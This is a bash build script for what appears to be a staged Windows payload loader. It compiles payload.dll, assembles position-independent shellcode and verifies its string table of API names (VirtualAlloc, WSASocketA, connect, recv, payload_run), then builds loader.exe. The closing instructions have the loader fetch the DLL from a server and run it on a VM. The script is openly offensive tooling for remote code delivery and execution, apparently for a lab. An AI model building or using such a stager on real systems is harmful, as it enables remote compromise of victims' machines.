#!/bin/bash
set -e
DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$DIR"

echo "[*] Compiling payload.dll..."
i686-w64-mingw32-gcc -shared -o payload.dll payload.c \
    -Wl,--out-implib,payload.lib -static-libgcc
echo "  OK: $(wc -c < payload.dll) bytes"

echo "[*] Assembling shellcode.asm..."
nasm -f bin shellcode.asm -o shellcode.bin
echo "  OK: $(wc -c < shellcode.bin) bytes"

echo "[*] Verifying string table..."
python3 -c "
data = open('shellcode.bin','rb').read()
s = data[5:]  # skip 5-byte call instruction
checks = [
    ( 0,  b'LoadLibraryA\x00'),
    (13,  b'GetProcAddress\x00'),
    (28,  b'VirtualAlloc\x00'),
    (41,  b'ws2_32.dll\x00'),
    (52,  b'WSAStartup\x00'),
    (63,  b'WSASocketA\x00'),
    (74,  b'connect\x00'),
    (82,  b'recv\x00'),
    (87,  b'payload_run\x00'),
]
ok = True
for off, expected in checks:
    actual = s[off:off+len(expected)]
    status = 'OK' if actual == expected else 'FAIL'
    if status == 'FAIL': ok = False
    print(f'  +{off:2d}: {status}  {actual}')
if not ok:
    print('ERROR: string table mismatch')
    exit(1)
print('All offsets correct.')
"

# Loader reads shellcode.bin directly from disk — no stale bytes
echo "[*] Compiling loader.exe..."
i686-w64-mingw32-g++ -o loader.exe loader.cpp -static
echo "  OK: $(wc -c < loader.exe) bytes"

echo ""
echo "[+] Build complete."
echo "[+] Copy loader.exe + shellcode.bin to the VM (payload.dll stays on the server)"
echo "[+] Start server.py, then run loader.exe"